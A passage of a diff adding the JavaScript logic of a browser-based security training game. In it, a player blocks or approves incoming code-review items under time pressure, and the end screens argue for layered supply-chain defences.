+  state.timeLeft = Math.min(WAVE_CONFIG[state.wave].timer, state.timeLeft + bonus);
+  updateTimer();
+}
+
+function decide(decision) {
+  if (state.decided || !state.activeItem) return;
+  state.decided = true;
+  clearInterval(state.itemTimer);
+
+  const item = state.activeItem;
+  const isCorrect = decision === item.correct;
+
+  if (isCorrect) {
+    state.correctCount++;
+    const timeBonus = Math.floor(state.timeLeft * 8);
+    state.score += 100 + timeBonus;
+    updateScore();
+    flashBody('ok');
+
+    if (decision === 'block') {
+      addIncidentLog(`<strong>Blocked:</strong> ${item.title} — good catch.`, 'ok', 'BLOCKED ✓');
+    }
+  } else {
+    state.wrongCount++;
+    state.security = Math.max(0, state.security + (item.secDelta || -15));
+    updateSecurityBar();
+    flashBody('danger');
+
+    if (item.wrongMsg) {
+      state.allWaveIncidents.push({ msg: item.wrongMsg, wave: state.wave });
+      addIncidentLog(item.wrongMsg, 'danger', 'INCIDENT 🚨');
+      showToast('🚨 ' + item.wrongMsg.substring(0, 60) + '…', true);
+    }
+    state.score = Math.max(0, state.score - 50);
+    updateScore();
+  }
+
+  state.activeItem = null;
+  setTimeout(activateNext, 400);
+}
+
+function handleAutoMerge() {
+  if (state.decided || !state.activeItem) return;
+  state.decided = true;
+  state.autoCount++;
+
+  const item = state.activeItem;
+
+  if (item.correct === 'block') {
+    // bad thing slipped through
+    state.security = Math.max(0, state.security + (item.secDelta || -15));
+    updateSecurityBar();
+    flashBody('danger');
+
+    const msg = item.autoMsg || `⚠️ ${item.title} auto-merged — review it later.`;
+    state.allWaveIncidents.push({ msg, wave: state.wave, auto: true });
+    addIncidentLog(msg, 'auto', 'AUTO-MERGED ⏱️');
+    showToast('⏱️ AUTO-MERGED: ' + item.id, true);
+  } else {
+    // safe thing auto-approved — fine
+    const msg = item.autoMsg || `${item.title} auto-merged ✓`;
+    showToast('⏱️ AUTO: ' + item.id, false);
+  }
+
+  state.activeItem = null;
+  setTimeout(activateNext, 300);
+}
+
+function endWave() {
+  clearInterval(state.spawnTimer);
+  clearInterval(state.itemTimer);
+
+  // auto-merge anything still in queue
+  while (state.pendingQueue.length > 0) {
+    const item = state.pendingQueue.shift();
+    state.autoCount++;
+    if (item.correct === 'block') {
+      state.security = Math.max(0, state.security + (item.secDelta || -15));
+      const msg = item.autoMsg || `⚠️ ${item.title} auto-merged (queue overflow)`;
+      state.allWaveIncidents.push({ msg, wave: state.wave, auto: true });
+    }
+  }
+
+  showWaveSummary();
+}
+
+function showWaveSummary() {
+  const cfg = WAVE_CONFIG[state.wave];
+  $('sum-wave-label').textContent = `WAVE ${state.wave + 1} COMPLETE — ${cfg.name.toUpperCase()}`;
+  $('sum-title').textContent = state.security > 70 ? 'Clean run! 🎉' : state.security > 40 ? 'Some damage. 😬' : 'Breach central. 🔥';
+
+  const waveIncidents = state.allWaveIncidents.filter(i => i.wave === state.wave);
+  const waveCorrect = state.correctCount;
+  const waveWrong = state.wrongCount;
+
+  $('sum-grid').innerHTML = `
+    <div class="sum-stat s-ok"><div class="sum-stat-num">${state.security}%</div><div class="sum-stat-label">Security</div></div>
+    <div class="sum-stat s-bad"><div class="sum-stat-num">${waveIncidents.length}</div><div class="sum-stat-label">Incidents</div></div>
+    <div class="sum-stat s-warn"><div class="sum-stat-num">${state.autoCount}</div><div class="sum-stat-label">Auto-merged</div></div>
+  `;
+
+  const recapEl = $('sum-recap-items');
+  if (waveIncidents.length === 0) {
+    recapEl.innerHTML = '<div class="recap-item" style="color:var(--green)">Nothing bad shipped. Excellent work.</div>';
+  } else {
+    recapEl.innerHTML = waveIncidents.map(i =>
+      `<div class="recap-item">${i.auto ? '⏱️ Auto-merged: ' : '❌ Approved: '}<strong>${i.msg}</strong></div>`
+    ).join('');
+  }
+
+  const isLastWave = state.wave >= 2;
+  $('sum-next-btn').textContent = isLastWave ? 'See Final Results →' : `Start Wave ${state.wave + 2} →`;
+
+  showScreen('summary-screen');
+}
+
+function nextWaveOrEnd() {
+  if (state.wave >= 2) {
+    showEndScreen();
+  } else {
+    state.wave++;
+    showWaveIntro(state.wave);
+  }
+}
+
+function showEndScreen() {
+  const allBadIncidents = state.allWaveIncidents;
+  const secScore = state.security;
+
+  let icon, title, subtitle;
+  if (secScore >= 85) {
+    icon = '🏆'; title = 'Bulletproof';
+    subtitle = 'You caught nearly everything. At this velocity, that\'s remarkable. Most teams can\'t.';
+  } else if (secScore >= 65) {
+    icon = '⚠️'; title = 'Breached, but Contained';
+    subtitle = 'A few things slipped through. In a real codebase at this scale, those would be incidents, CVEs, or data leaks.';
+  } else if (secScore >= 40) {
+    icon = '🔥'; title = 'Significant Exposure';
+    subtitle = 'The queue moved faster than your review process. This is what happens at scale without tooling and governance.';
+  } else {
+    icon = '💀'; title = 'Total Compromise';
+    subtitle = 'The AI assistant shipped faster than any human can review. This isn\'t about skill — it\'s about the absence of automated defense layers.';
+  }
+
+  $('end-icon').textContent = icon;
+  $('end-title').textContent = title;
+  $('end-subtitle').textContent = subtitle;
+
+  const grade = secScore >= 85 ? 'Senior engineer + great tooling' :
+    secScore >= 65 ? 'Good instincts, not enough time' :
+    secScore >= 40 ? 'Classic triage fatigue — you need automation' :
+    'The queue won. Governance matters more than skill at scale.';
+
+  $('end-grade').innerHTML = `<strong>Verdict:</strong> ${grade}<br><br>
+The real lesson: at this pace, <strong>no individual reviewer can reliably catch everything</strong>.
+That\'s not a failure of attention — it\'s a failure of process. The answer is <em>layered defense</em>:
+SBOMs, automated CVE scanning, package provenance checks, AI-generated code policies, and supply chain signing.
+<strong>Humans are the last line of defence, not the first.</strong>`;
+
+  $('stats-final').innerHTML = `
+    <div class="sum-stat s-ok"><div class="sum-stat-num">${state.security}%</div><div class="sum-stat-label">Final Security</div></div>
+    <div class="sum-stat s-bad"><div class="sum-stat-num">${allBadIncidents.length}</div><div class="sum-stat-label">Total Incidents</div></div>
+    <div class="sum-stat s-warn"><div class="sum-stat-num">${state.score}</div><div class="sum-stat-label">Score</div></div>
+  `;
+
+  const impactEl = $('impact-items');
+  if (allBadIncidents.length === 0) {
+    impactEl.innerHTML = '<div class="impact-row" style="color:var(--green)">Nothing. Clean sweep. Impressive.</div>';
+  } else {
+    impactEl.innerHTML = allBadIncidents.map(i =>
+      `<div class="impact-row"><strong>${i.auto ? '⏱️ Auto-merged' : '❌ Approved'}:</strong> ${i.msg}</div>`
+    ).join('');
+  }
+
+  showScreen('end-screen');
+}
+
+// ─────────────────────────────────────────────────
+//  KEYBOARD
+// ─────────────────────────────────────────────────
+document.addEventListener('keydown', e => {
+  if (!$('game-screen').classList.contains('active')) return;
+  if (e.key === 'ArrowLeft' || e.key === 'a' || e.key === 'A') decide('block');
+  if (e.key === 'ArrowRight' || e.key === 'd' || e.key === 'D') decide('approve');
+  if (e.key === 'i' || e.key === 'I') inspect();
+});
+</script>
+</body>
+</html>
